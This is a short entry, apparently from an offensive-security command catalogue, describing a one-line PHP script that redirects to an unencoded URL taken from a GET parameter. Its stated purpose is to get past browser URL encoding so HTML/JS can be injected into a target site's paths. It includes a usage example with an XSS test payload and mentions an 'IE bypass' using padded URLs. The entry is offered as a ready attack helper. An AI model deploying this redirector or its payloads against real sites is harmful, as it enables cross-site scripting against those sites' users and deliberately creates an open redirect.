---
id: cmd-php-redirect
data: '<?php $url=$_GET[''x'']; header("Location: $url"); ?>'
tags:
  - redirect
  - bypass
type: command
output: null
executor: php
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:55:20.786Z'
verified: false
validated: true
submitted: true
---
# php-redirect-script

## Command

```php
<?php $url=$_GET['x']; header("Location: $url"); ?>
```

## Description

PHP script that reads a URL from the 'x' GET parameter and issues a 302 redirect without encoding, used to bypass browser URL encoding for injecting HTML/JS into paths.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `x` | Target URL to redirect to (e.g., with HTML tags) | Yes |

## Examples

### Basic Usage

Save as `redir.php` and access: `http://server/redir.php?x=https://target.com/<script>alert(1)</script>`

### Advanced Usage

Host on a server and call with padded URLs for IE bypass.

## Expected Output

No output; browser redirects to the specified URL with raw content.

## Related

- [[procedures/Create-PHP-Redirect-for-Unencoded-URLs]]
